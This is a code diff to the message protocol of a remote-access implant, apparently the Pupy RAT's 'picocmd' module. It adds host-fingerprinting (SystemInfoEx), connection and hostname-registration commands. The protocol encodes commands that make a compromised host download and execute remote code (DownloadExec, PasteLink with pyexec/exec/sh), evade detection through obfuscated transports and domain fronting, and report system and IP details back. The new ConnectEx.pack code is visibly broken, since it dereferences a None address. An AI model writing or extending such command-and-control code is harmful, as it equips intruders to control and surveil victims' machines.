@@ -10,11 +10,18 @@ __all__ = (
     'SetProxy', 'Connect', 'DownloadExec',
     'PasteLink', 'OnlineStatus', 'PortQuizPort',
     'OnlineStatusRequest', 'PupyState', 'CustomEvent',
-    'ConnectablePort', 'Error', 'ParcelInvalidCrc',
+    'ConnectablePort', 'Error',
+
+    'SystemInfoEx', 'ConnectEx', 'RegisterHostnameId',
+
+    'ParcelInvalidCrc',
     'ParcelInvalidPayload', 'ParcelInvalidCommand',
     'Parcel', 'PackError',
+    'UnregisteredTargetId',
 
-    'from_bytes', 'to_bytes'
+    'from_bytes', 'to_bytes',
+
+    'AddressTable'
 )
 
 import struct
@@ -29,8 +36,9 @@ import uuid
 import urlparse
 import socket
 
-import baseconv
-import dns_encoder
+from network.lib.picocmd import (
+    baseconv, dns_encoder, dns_encoder_table
+)
 
 try:
     import psutil
@@ -48,8 +56,79 @@ except ImportError:
     online = None
 
 
+def unpack_ip_address(packed):
+    if len(packed) == 4:
+        return netaddr.IPAddress(
+            netaddr.strategy.ipv4.packed_to_int(packed), 4
+        )
+    elif len(packed) == 16:
+        return netaddr.IPAddress(
+            netaddr.strategy.ipv6.packed_to_int(packed), 6
+        )
+    else:
+        raise NotImplementedError('Only 4 and 16 bytes are supported')
+
+
 class PackError(Exception):
     pass
+
+
+class UnregisteredTargetId(PackError):
+    pass
+
+
+class AddressTable(object):
+    __slots__ = ('table', 'auto_target_id')
+
+    def __init__(self):
+        self.table = {}
+        self.auto_target_id = 0
+
+    def get_target_id(self, address):
+        if address in self.table:
+            return self.table[address]
+
+        raise UnregisteredTargetId(address)
+
+    def get_address(self, target_id):
+        address = None
+        for this_address, this_target_id in self.table.iteritems():
+            if this_target_id == target_id:
+                address = this_address
+                break
+
+        if address is None:
+            raise UnregisteredTargetId(target_id)
+
+        return address
+
+    def _find_free_target_id(self):
+        auto_target_id_is_ok = True
+
+        for used_target_id in self.table.itervalues():
+            if self.auto_target_id == used_target_id:
+                auto_target_id_is_ok = False
+                break
+
+        if auto_target_id_is_ok:
+            target_id = self.auto_target_id
+            self.auto_target_id = (self.auto_target_id + 1) % 0xFFFF
+            return target_id
+
+        used_target_ids = set(self.table.values())
+        for target_id in xrange(0xFFFF):
+            if target_id not in used_target_ids:
+                return target_id
+
+        raise ValueError('No more free slots')
+
+    def register(self, address, target_id=None):
+        if target_id is None:
+            target_id = self._find_free_target_id()
+
+        self.table[address] = target_id
+
+        return target_id
 
 
 def from_bytes(bytes):
@@ -67,13 +146,36 @@ def to_bytes(value, size=0):
     return bytes
 
 
-def generate_encoding_tables(*alphabet):
-    decode = dict(enumerate(alphabet, 1))
-    encode = {
-        v:k for k,v in decode.iteritems()
-    }
+class EncodingTableUnregisteredElement(KeyError):
+    pass
 
-    return encode, decode
+
+class EncodingTable(object):
+    __slots__ = ('_encode', '_decode')
+
+    def __init__(self, *alphabet, **kwargs):
+        start = kwargs.get('start', 0)
+        self._decode = dict(enumerate(alphabet, start))
+        self._encode = {
+            v:k for k,v in self._decode.iteritems()
+        }
+
+    def is_registered(self, value):
+        return value in self._encode
+
+    def encode(self, value):
+        encoded = self._encode.get(value, None)
+        if encoded is None:
+            raise EncodingTableUnregisteredElement(value)
+
+        return encoded
+
+    def decode(self, value):
+        decoded = self._decode.get(value, None)
+        if decoded is None:
+            raise EncodingTableUnregisteredElement(value)
+
+        return decoded
 
 
 class Command(object):
@@ -88,6 +190,16 @@ class Command(object):
     @staticmethod
     def unpack(data):
         return Command(), 0
+
+    def get_dict(self):
+        return {
+            slot: getattr(self, slot) for slot in self.__slots__
+        }
+
+    def __repr__(self):
+        return '{' + self.__class__.__name__ + ': ' + ' '.join(
+            '{}={}'.format(slot.upper(), getattr(self, slot)) for slot in self.__slots__
+        ) + '}'
 
 
 class Poll(Command):
@@ -371,13 +483,14 @@ class SystemInfo(Command):
 
     # To do, add more? Who knows how platform.uname looks like on other platforms?
     # How many are there? Let's use 3 bits for that - 8 systems in total
-    well_known_os_names_encode, well_known_os_names_decode = \
-      generate_encoding_tables(
-        'Linux', 'Windows', 'SunOS', 'android')
+    well_known_os_names = EncodingTable(
+        'Linux', 'Windows', 'SunOS', 'android'
+    )
 
     # Same question.
-    well_known_cpu_archs_encode, well_known_cpu_archs_decode = \
-      generate_encoding_tables('x86', 'x86', 'x64', 'x64', 'arm')
+    well_known_cpu_archs = EncodingTable(
+        'x86', 'x86', 'x64', 'x64', 'arm'
+    )
 
     well_known_machines_equality = {
         'i386': 'x86',
@@ -426,8 +539,8 @@ class SystemInfo(Command):
 
     def pack(self):
         # 3 bits for system, 3 bits for arch, 1 bit for internet
-        osid = self.well_known_os_names_encode[self.system]
-        archid = self.well_known_cpu_archs_encode[self.arch]
+        osid = self.well_known_os_names.encode(self.system)
+        archid = self.well_known_cpu_archs.encode(self.arch)
         block = osid << 4 | archid << 1 | int(bool(self.internet))
         boottime = int(time.mktime(self.boottime.timetuple()))
         return struct.pack('B', block) + to_bytes(self.node, 6) + \
@@ -477,9 +590,9 @@ class SystemInfo(Command):
             pass
 
         return SystemInfo(
-            system=SystemInfo.well_known_os_names_decode[osid],
+            system=SystemInfo.well_known_os_names.decode(osid),
             node=node,
-            arch=SystemInfo.well_known_cpu_archs_decode[archid],
+            arch=SystemInfo.well_known_cpu_archs.decode(archid),
             internet=internet,
             external_ip=ip,
             boottime=boottime
@@ -489,8 +602,10 @@ class SystemInfo(Command):
 class SetProxy(Command):
     __slots__ = ('scheme', 'ip', 'port', 'user', 'password')
 
-    well_known_proxy_schemes_encode, well_known_proxy_schemes_decode = \
-      generate_encoding_tables('none', 'socks4', 'socks5', 'http', 'any')
+    well_known_proxy_schemes = EncodingTable(
+        'none', 'socks4', 'socks5', 'http', 'any',
+        start=1
+    )
 
     def __init__(self, scheme, ip, port, user=None, password=None):
         if scheme == 'socks':
@@ -512,7 +627,7 @@ class SetProxy(Command):
             self.password = ''
 
     def pack(self):
-        scheme = chr(self.well_known_proxy_schemes_encode[self.scheme])
+        scheme = chr(self.well_known_proxy_schemes.encode(self.scheme))
         ip = struct.pack('>I', int(self.ip))
         port = struct.pack('>H', int(self.port))
         user = self.user or ''
@@ -525,7 +640,7 @@ class SetProxy(Command):
     def unpack(data):
         sip = struct.calcsize('>BIH')
         scheme, ip, port = struct.unpack_from('>BIH', data)
-        scheme = SetProxy.well_known_proxy_schemes_decode[scheme]
+        scheme = SetProxy.well_known_proxy_schemes.decode(scheme)
         ip = netaddr.IPAddress(ip)
         data = data[sip:]
 
@@ -563,11 +678,12 @@ class SetProxy(Command):
 class Connect(Command):
     __slots__ = ('ip', 'port', 'transport')
 
-    well_known_transports_encode, well_known_transports_decode = \
-      generate_encoding_tables(
-        'obfs3','kc4','http','tcp_cleartext','rsa',
-        'ssl','udp_cleartext','scramblesuit','ssl_rsa', 'ec4',
-        'ws', 'ecm')
+    well_known_transports = EncodingTable(
+        'obfs3', 'kc4', 'http', 'tcp_cleartext', 'rsa',
+        'ssl', 'udp_cleartext', 'scramblesuit', 'ssl_rsa',
+        'ec4', 'ws', 'ecm',
+        start=1
+    )
 
     def __init__(self, ip, port, transport='ssl'):
         self.transport = transport
@@ -582,8 +698,8 @@ class Connect(Command):
 
     def pack(self):
         message = b''
-        if self.transport in self.well_known_transports_encode:
-            code = (1 << 7) | self.well_known_transports_encode[self.transport]
+        if self.well_known_transports.is_registered(self.transport):
+            code = (1 << 7) | self.well_known_transports.encode(self.transport)
             message = message + struct.pack('B', code)
         else:
             if len(self.transport) > 24:
@@ -609,7 +725,7 @@ class Connect(Command):
         transport, rest = data[:1], data[1:]
         transport = struct.unpack('B', transport)[0]
         if transport & 1<<7:
-            transport = Connect.well_known_transports_decode[transport & (1<<7)-1]
+            transport = Connect.well_known_transports.decode(transport & (1<<7)-1)
         else:
             transport, rest = rest[:transport], rest[transport:]
 
@@ -625,12 +741,14 @@ class DownloadExec(Command):
     __slots__ = ('proxy', 'url', 'action')
 
     # 2 bits - 3 max
-    well_known_downloadexec_action_encode, well_known_downloadexec_action_decode = \
-      generate_encoding_tables('pyexec', 'exec', 'sh')
+    well_known_downloadexec_action = EncodingTable(
+        'pyexec', 'exec', 'sh'
+    )
 
     # 3 bits - 7 max
-    well_known_downloadexec_scheme_encode, well_known_downloadexec_scheme_decode = \
-      generate_encoding_tables('http', 'https', 'ftp', 'tcp', 'udp', 'tls')
+    well_known_downloadexec_scheme = EncodingTable(
+        'http', 'https', 'ftp', 'tcp', 'udp', 'tls'
+    )
 
     def __init__(self, url, action='pyexec', proxy=False):
         self.proxy = bool(proxy)
@@ -639,7 +757,7 @@ class DownloadExec(Command):
 
     def pack(self):
         try:
-            action = self.well_known_downloadexec_action_encode[self.action]
+            action = self.well_known_downloadexec_action.encode(self.action)
         except:
             raise PackError('Unknown action: {}'.format(self.action))
 
@@ -665,10 +783,8 @@ class DownloadExec(Command):
             raise PackError('Too big url path')
 
         try:
-            scheme = self.well_known_downloadexec_scheme_encode[
-                url.scheme
-            ]
-        except:
+            scheme = self.well_known_downloadexec_scheme.encode(url.scheme)
+        except EncodingTableUnregisteredElement:
             raise PackError('Unknown scheme: {}'.format(url.scheme))
 
         code = (self.proxy << 5) | (action << 3) | scheme
@@ -686,8 +802,8 @@ class DownloadExec(Command):
     def unpack(data):
         bsize = struct.calcsize('BIHB')
         code, addr, port, plen = struct.unpack_from('BIHB', data)
-        action = DownloadExec.well_known_downloadexec_action_decode[(code >> 3) & 3]
-        scheme = DownloadExec.well_known_downloadexec_scheme_decode[code & 7]
+        action = DownloadExec.well_known_downloadexec_action.decode((code >> 3) & 3)
+        scheme = DownloadExec.well_known_downloadexec_scheme.decode(code & 7)
         proxy = bool((code >> 5) & 1)
         host = str(netaddr.IPAddress(addr))
         port = ':{}'.format(port) if port else (
@@ -757,8 +873,9 @@ class PasteLink(Command):
     }
 
     # 4 max - 2 bits
-    well_known_pastebin_action_encode, well_known_pastebin_action_decode = \
-      generate_encoding_tables('pyexec', 'exec', 'sh')
+    well_known_pastebin_action = EncodingTable(
+        'pyexec', 'exec', 'sh'
+    )
 
     def __init__(self, url, action='pyexec'):
         self.url = url
@@ -769,7 +886,7 @@ class PasteLink(Command):
 
         well_known_found = False
 
-        if self.action not in self.well_known_pastebin_action_encode:
+        if not self.well_known_pastebin_action.is_registered(self.action):
             raise PackError('User-defined actions are not supported')
 
         for (service, encode, decode), code in self.well_known_paste_services_encode.iteritems():
@@ -778,7 +895,7 @@ class PasteLink(Command):
                 paste = encode(match.groups()[0])
                 message = struct.pack(
                     'BB',
-                    (1<<7) | (self.well_known_pastebin_action_encode[self.action] << 5) | code,
+                    (1<<7) | (self.well_known_pastebin_action.encode(self.action) << 5) | code,
                     len(paste)
                 ) + paste
                 well_known_found = True
@@ -790,7 +907,7 @@ class PasteLink(Command):
 
             message = struct.pack(
                 'B',
-                self.well_known_pastebin_action_encode[self.action] << 5 | len(self.url)
+                self.well_known_pastebin_action.encode(self.action) << 5 | len(self.url)
             ) + self.url
 
         return message
@@ -804,13 +921,13 @@ class PasteLink(Command):
     def unpack(data):
         h1 = struct.unpack_from('B', data)[0]
         if h1 & (1<<7):
-            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
+            action = PasteLink.well_known_pastebin_action.decode((h1 >> 5) & 3)
             urltpl, encode, decode = PasteLink.well_known_paste_services_decode[h1 & 7]
             _, length = struct.unpack_from('BB', data)
             url = urltpl.format(decode(data[2:2+length]))
             return PasteLink(url, action), 2+length
         else:
-            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
+            action = PasteLink.well_known_pastebin_action.decode((h1 >> 5) & 3)
             length = h1 & 31
             return PasteLink(data[1:length+1], action), 1+length
 
@@ -1008,91 +1125,353 @@ class ConnectablePort(Command):
         return '{{OPEN: {}:{}}}'.format(self.ip, ','.join(str(x) for x in self.ports))
 
 
-class ConnectEx(Command):
+class SystemInfoEx(Command):
     __slots__ = (
-        'version', 'address', 'is_hostname',
-        'port', 'fronting', 'transport'
+        'version',
+
+        'os', 'arch', 'node', 'boottime', 'internet',
+        'external_ip', 'internal_ip'
     )
 
-    IPV4 = 0b01
-    IPV6 = 0b10
-    TARGET_ID = 0b11
+    CURRENT_VERSION = 1
+    IS_ONLINE = 1 << 4
+    HAS_EXTERNAL_IP = 1 << 3
+    EXTERNAL_IP_IS_IPV6 = 1 << 2
+    HAS_INTERNAL_IP = 1 << 1
+    INTERNAL_IP_IS_IPV6 = 1 << 0
 
-    well_known_transports_encode, well_known_transports_decode = \
-      generate_encoding_tables(
-          'obfs3','kc4','http', 'rsa', 'ssl','scramblesuit',
-          'ssl_rsa', 'ec4', 'ws', 'ecm', 'dfws')
+    well_known_os_names = EncodingTable(
+        'Linux', 'Windows', 'SunOS', 'android'
+    )
+
+    well_known_cpu_archs = EncodingTable(
+        'unknown', 'x86', 'x64', 'arm', 'mips'
+    )
+
+    x86_re = re.compile(r'i[2-6]86')
+
+    @staticmethod
+    def _arch_to_type(arch):
+        arch = arch.lower().strip()
+
+        if SystemInfoEx.x86_re.match(arch) or arch == 'i86pc':
+            return 'x86'
+        elif arch in ('x86_64', 'amd64'):
+            return 'x64'
+        elif arch.startswith('arm'):
+            return 'arm'
+        elif arch.startswith('mips'):
+            return 'mips'
+        else:
+            return 'unknown'
+
+    def _initialize_from_current_system(self):
+        self.version = SystemInfoEx.CURRENT_VERSION
+        self.os = platform.system()
+        self.arch = SystemInfoEx._arch_to_type(platform.machine())
+        self.node = uuid.getnode()
+
+        try:
+            self.boottime = datetime.datetime.fromtimestamp(
+                psutil.boot_time()
+            )
+        except:
+            self.boottime = datetime.datetime.fromtimestamp(0)
+
+        self.external_ip = online.external_ip()
+        if self.external_ip:
+            self.internet = True
+        else:
+            self.internet = online.online()
+
+        self.internal_ip = online.internal_ip()
+
+    def __init__(
+        self, version=None, os=None, arch=None, node=None, boottime=None,
+            external_ip=None, internal_ip=None, internet=None):
+
+        if all(var is None for var in (
+                version, os, arch, node, boottime,
+                external_ip, internal_ip, internet)):
+            self._initialize_from_current_system()
+        else:
+            self.version = version
+            self.os = os
+            self.arch = arch
+            self.node = node
+            self.boottime = boottime
+            self.internet = internet
+
+            if external_ip:
+                self.external_ip = netaddr.IPAddress(external_ip)
+            else:
+                self.external_ip = None
+
+            if internal_ip:
+                self.internal_ip = netaddr.IPAddress(internal_ip)
+            else:
+                self.internal_ip = None
+
+    def pack(self):
+        # 1b Version
+        # 1b OS, Arch (4b)
+        # 6b Node
+        # 4b BootTime
+        # 1b Flags
+        #    3 bits are reserved
+        #    Internet access present
+        #    External IP present
+        #    Is External IP - IPv6
+        #    Internal IP present
+        #    Is Internal IP - IPv6
+        # 4 - 16b - External IP
+        # 4 - 16b - Internal IP
+        # Total:  21 - 45b
+
+        flags = 0
+
+        if self.internet:
+            flags |= SystemInfoEx.IS_ONLINE
+
+        if self.internal_ip is not None and self.internal_ip != self.external_ip:
+            flags |= SystemInfoEx.HAS_INTERNAL_IP
+            if self.internal_ip.version == 6:
+                flags |= SystemInfoEx.INTERNAL_IP_IS_IPV6
+
+        if self.external_ip is not None:
+            flags |= SystemInfoEx.HAS_EXTERNAL_IP
+            if self.external_ip.version == 6:
+                flags |= SystemInfoEx.EXTERNAL_IP_IS_IPV6
+
+        return b''.join([
+            chr(self.version),
+            chr(SystemInfoEx.well_known_os_names.encode(self.os) << 4 | \
+                SystemInfoEx.well_known_cpu_archs.encode(self.arch)),
+            to_bytes(self.node, 6),
+            struct.pack('>I', int(time.mktime(self.boottime.timetuple()))),
+            chr(flags),
+            self.external_ip.packed if self.external_ip else b'',
+            self.internal_ip.packed if self.internal_ip else b'',
+        ])
+
+    @staticmethod
+    def _unpack_v1(data):
+        version = ord(data[0])
+        os_arch = ord(data[1])
+        os = SystemInfoEx.well_known_os_names.decode((os_arch >> 4) & 0b1111)
+        arch = SystemInfoEx.well_known_cpu_archs.decode(os_arch & 0b1111)
+        node = from_bytes(data[2:2+6])
+        boottime, = struct.unpack('>I', data[8:8+4])
+
+        try:
+            boottime = datetime.datetime.fromtimestamp(boottime)
+        except:
+            boottime = None
+
+        flags = ord(data[12])
+
+        external_ip = None
+        internal_ip = None
+        internet = None
+
+        consumed = 13
+
+        internet = bool(flags & SystemInfoEx.IS_ONLINE)
+
+        if flags & SystemInfoEx.HAS_INTERNAL_IP:
+            if flags & SystemInfoEx.INTERNAL_IP_IS_IPV6:
+                internal_ip = unpack_ip_address(data[consumed:consumed+16])
+                consumed += 16
+            else:
+                internal_ip = unpack_ip_address(data[consumed:consumed+4])
+                consumed += 4
+
+        if flags & SystemInfoEx.HAS_EXTERNAL_IP:
+            if flags & SystemInfoEx.EXTERNAL_IP_IS_IPV6:
+                external_ip = unpack_ip_address(data[consumed:consumed+16])
+                consumed += 16
+            else:
+                external_ip = unpack_ip_address(data[consumed:consumed+4])
+                consumed += 4
+
+        return SystemInfoEx(
+            version, os, arch, node, boottime, external_ip, internal_ip, internet
+        ), consumed
+
+    @staticmethod
+    def unpack(data):
+        version = ord(data[0])
+        if version == 1:
+            return SystemInfoEx._unpack_v1(data)
+        else:
+            raise NotImplementedError(
+                'SystemInfoEx: Unsupported version {}'.format(version))
+
+    def __repr__(self):
+        return '{{SYS: OS={} ARCH={} NODE={:012X} IP={}/{} ' \
+            'BOOT={} INTERNET={}}}'.format(
+                self.os, self.arch, self.node, self.external_ip,
+                self.internal_ip, self.boottime.ctime(),
+                self.internet
+            )
+
+
+class ConnectEx(Command):
+    __slots__ = (
+        'address', 'port', 'fronting', 'transport', 'address_type'
+    )
+
+    IPV4 = 0b001
+    IPV6 = 0b010
+    TARGET_ID = 0b011
+
+    well_known_transports = EncodingTable(
+        'obfs3', 'kc4', 'http', 'rsa', 'ssl',
+        'scramblesuit', 'ssl_rsa', 'ec4', 'ws', 'ecm', 'dfws'
+    )
 
     #  1        - FRONTING
     #   111     - TYPE
-    #      1111 - PORT
+    #      0000 - RESERVED
     #  11111111 - TRANSPORT
+    #  2x1      - PORT
+    #  2x1      - TARGET_ID
+    #  2x1      - FRONTING TARGET_ID (IF ANY, or NONE)
+    #      OR
+    #  4x1      - IPv4 ADDRESS
+    #      OR
+    #  16x1     - IPv6 ADDRESS
 
-    def __init__(self, address):
-        pass
+    def __init__(self, address, port, transport, fronting=None):
+        self.address = None
 
-    def pack(self):
-        address_type = None
-        address = None
-
-        if type(self.address) in (long, int) and \
-          self.address > 0 and self.address < 65536:
-            address_type = ConnectEx.TARGET_ID
-            address = struct.pack('>H', self.address)
-        else:
+        if type(address) in (str, unicode):
             try:
-                address = netaddr.IPAddress(self.address)
-                if address.verision == 6:
-                    address_type = ConnectEx.IPV6
+                self.address = netaddr.IPAddress(address)
+                if self.address.version == 6:
+                    self.address_type = ConnectEx.IPV6
                 else:
-                    address_type = ConnectEx.IPV4
-
-                address = address.packed
+                    self.address_type = ConnectEx.IPV4
 
             except netaddr.AddrFormatError:
-                raise ValueError('Invalid address type')
+                pass
 
+        elif type(address) in (long, int) and address >= 0 and address < 65536:
+            self.address = address
+            self.address_type = ConnectEx.TARGET_ID
+
+        else:
+            raise NotImplementedError(
+                'Unsupported address type {}'.format(type(address)))
+
+        self.port = int(port)
+        self.transport = transport
+        self.fronting = fronting
+
+    def __repr__(self):
+        return '{{CONNECT_EX {}:{} {}{}}}'.format(
+            self.address, self.port, self.transport,
+            ' FRONT={}'.format(self.fronting) if self.fronting else '')
+
+    def pack(self):
+        address = None
+        fronting = None
+        port = None
+
+        if self.address_type == ConnectEx.TARGET_ID:
+            address = struct.pack('>H', self.address)
+        else:
+            address = address.packed
+
+        if self.fronting:
+            if type(self.fronting) in (long, int) and \
+                    self.fronting > 0 and self.fronting < 65536:
+                fronting = struct.pack('>H', self.fronting)
+            else:
+                raise NotImplementedError(
+                    'Address type {} is not supported'.format(type(self.fronting)))
+
+        port = struct.pack('>H', self.port)
+        transport = self.well_known_transports.encode(self.transport)
+
+        info_byte = 0b0
+        if fronting:
+            info_byte |= 1 << 7
+
+        info_byte |= self.address_type << 4
+
+        packed = b''.join([
+            chr(info_byte),
+            chr(transport),
+            port, address,
+            fronting if fronting else ''
+        ])
+
+        return packed
+
+    @staticmethod
+    def unpack(data):
+        info_byte = ord(data[0])
+        fronting = (info_byte >> 7) & 0b1
+        address_type = (info_byte >> 4) & 0b111
+
+        transport = ConnectEx.well_known_transports.decode(ord(data[1]))
+        port, = struct.unpack_from('>H', data[2:])
+
+        consumed = 4
+
+        if address_type == ConnectEx.IPV4:
+            address = unpack_ip_address(data[consumed:consumed+4])
+            consumed += 4
+        elif address_type == ConnectEx.IPV6:
+            address = unpack_ip_address(data[consumed:consumed+16])
+            consumed += 16
+        else:
+            target_id, = struct.unpack_from('>H', data[consumed:])
+            address = target_id
+            consumed += 2
+
+            if fronting:
+                frontinig_target_id, = struct.unpack_from('>H', data[consumed:])
+                fronting = frontinig_target_id
+                consumed += 2
+
+        return ConnectEx(address, port, transport, fronting), consumed
 
 
 class RegisterHostnameId(Command):
     __slots__ = ('hostname', 'id')
 
-    encoder = dns_encoder.DnsEncoder()
+    encoder = dns_encoder.DnsEncoder(dns_encoder_table.TREES)
 
     def __init__(self, hid, hostname):
         self.id = hid
         self.hostname = hostname
 
     def pack(self):
-        encoded_hostname = RegisterHostnameId.dns_encoder.encode(self.hostname)
-        return struct.pack('>H', self.id) + encoded_hostname
+        encoded_hostname = RegisterHostnameId.encoder.encode(self.hostname)
+        return struct.pack('>BH', len(encoded_hostname), self.id) + encoded_hostname
 
     @staticmethod
     def unpack(data):
-        hid, = struct.unpack_from('>H', data)
-        decoded, rest = RegisterHostnameId.dns_encoder.decode(data[2:])
+        encoded_len, hid = struct.unpack_from('>BH', data)
+        decoded, rest = RegisterHostnameId.encoder.decode(data[3:3+encoded_len])
 
-        return RegisterHostnameId(hid, decoded), len(data) - len(rest)
+        return RegisterHostnameId(hid, decoded), 3 + encoded_len
 
     def __repr__(self):
-        return '{{{} => {}}}'.format(self.hid, self.hostname)
+        return '{{REGISTER HOSTNAME: {} => {}}}'.format(
+            self.id, self.hostname)
 
 
 class Error(Command):
 
     __slots__ = ('error', 'message')
 
-    errors = [
-        'NO_ERROR',
-        'NO_SESSION',
-        'NO_COMMAND',
-        'NO_POLICY',
-        'CRC_FAILED',
-        'EXCEPTION'
-    ]
-
-    errors_decode = dict(enumerate(errors))
-    errors_encode = {v:k for k,v in errors_decode.iteritems()}
+    errors = EncodingTable(
+        'NO_ERROR', 'NO_SESSION', 'NO_COMMAND',
+        'NO_POLICY', 'CRC_FAILED', 'EXCEPTION'
+    )
 
     def __init__(self, error, message=''):
         self.error = error
@@ -1102,7 +1481,7 @@ class Error(Command):
         if len(self.message) > 25:
             raise PackError('Message too big')
 
-        return struct.pack('B', self.errors_encode[self.error] << 5 | len(self.message))+self.message
+        return struct.pack('B', self.errors.encode(self.error) << 5 | len(self.message))+self.message
 
     def __repr__(self):
         return '{{{}{}}}'.format(self.error, ': '+self.message if self.message else '')
@@ -1112,7 +1491,7 @@ class Error(Command):
         header = ord(data[0])
         code = (header >> 5) & 7
         length = header & 31
-        return Error(Error.errors_decode[code], data[1:1+length]), 1+length
+        return Error(Error.errors.decode(code), data[1:1+length]), 1+length
 
 
 class CustomEvent(Command):
@@ -1165,20 +1544,26 @@ class Parcel(object):
 
     # Explicitly define commands. In other case make break something
 
-    commands_encode, commands_decode = generate_encoding_tables(
+    registered_commands = EncodingTable(
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
         SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
-        PortQuizPort, PupyState, CustomEvent
+        PortQuizPort, PupyState, CustomEvent,
+        # V2 Commands
+        SystemInfoEx, ConnectEx, RegisterHostnameId
     )
 
     def __init__(self, *commands):
+        missing = set()
 
-        if not all((type(command) in self.commands_encode) for command in commands):
-            missing = [
-                command for command in commands if not type(command) in self.commands_encode
-            ]
+        for command in commands:
+            kommand = type(command)
+
+            if not Parcel.registered_commands.is_registered(kommand):
+                missing.add(kommand)
+
+        if missing:
             raise ParcelInvalidCommand(missing)
 
         self.commands = commands
@@ -1203,7 +1588,7 @@ class Parcel(object):
         gen_csum = gen_csum or Parcel._gen_crc32
 
         data = b''.join([
-            chr(self.commands_encode[type(command)]) + command.pack() for command in self.commands
+            chr(self.registered_commands.encode(type(command))) + command.pack() for command in self.commands
         ])
 
         return gen_csum(data, nonce) + data
@@ -1230,7 +1615,8 @@ class Parcel(object):
 
             while data:
                 command, data = data[:1], data[1:]
-                cmd, offt = Parcel.commands_decode[ord(command)].unpack(data)
+                cmd, offt = Parcel.registered_commands.decode(
+                    ord(command)).unpack(data)
                 messages.append(cmd)
                 data = data[offt:]
 
